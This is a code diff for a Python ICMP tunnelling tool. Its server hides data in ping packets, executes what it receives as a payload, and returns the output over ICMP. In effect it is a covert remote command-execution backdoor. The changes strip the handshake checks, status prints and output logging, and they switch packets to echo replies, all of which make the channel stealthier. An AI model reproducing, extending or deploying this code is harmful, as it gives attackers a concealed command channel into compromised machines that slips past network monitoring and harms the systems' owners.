@@ -20,11 +20,6 @@ class Server():
         addr = [None]
         data = b''
         run = True
-        
-        while addr[0] != self.src_ip:
-            packet, addr = self.sock.recvfrom(1024)
-        
-        print(f"[*] Received ICMP packet test from {addr[0]}")
 
         while run:
             packet, addr = self.sock.recvfrom(1024)
@@ -33,7 +28,6 @@ class Server():
                 if SIGNAL_SUBSTRING in icmp_data:
                     run = False
                 data += icmp_data
-                print(f"[+] Received data from {addr[0]}: {icmp_data}")
         result_string = data.replace(SIGNAL_SUBSTRING, b"")
         return result_string
     
@@ -54,7 +48,6 @@ class Server():
 
         p = Payload(data, out)
         output = p.exec_payload()
-        self.write_output(output)
         self.send(output)
 
 class Client():
@@ -79,11 +72,6 @@ class Client():
         data = b''
         run = True
         
-        while addr[0] != self.dst_ip:
-            packet, addr = self.sock.recvfrom(1024)
-        
-        print(f"[*] Received ICMP packet test from {addr[0]}")
-
         while run:
             packet, addr = self.sock.recvfrom(1024)
             if addr[0] == self.dst_ip:
@@ -95,10 +83,11 @@ class Client():
         result_string = data.replace(SIGNAL_SUBSTRING, b"")
         return result_string
 
-    def main_func(self, data:str):
+    def main_func(self, data):
         self.send(str.encode(data))
         data = self.listen()
-        print(f"Received data: {data}")
+        encoding = 'utf-8'
+        print(f"Received data: {str(data, encoding)}")
 
 class ICMP():
     def __init__(self, src_ip):
@@ -108,16 +97,9 @@ class ICMP():
     def checksum(source_string):
         sum = 0
         count_to = (int(len(source_string) / 2)) * 2
-        #count_to = (len(source_string) - 1)
-
-        #debug
-        #print(f'Length: {len(source_string)}')
-        #print(f'count_to: {count_to}')
 
         count = 0
         while count < count_to:
-            #debug
-            #print(f'count: {count}')
             this_val = source_string[count + 1]*256+source_string[count]
             sum = sum + this_val
             sum = sum & 0xffffffff
@@ -134,7 +116,7 @@ class ICMP():
     
     @staticmethod
     def create_packet(id, data:bytes):
-        ICMP_ECHO_REQUEST=8
+        ICMP_ECHO_REQUEST=0
         data = data + SIGNAL_SUBSTRING
         header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)
         my_checksum = ICMP.checksum(header + data)
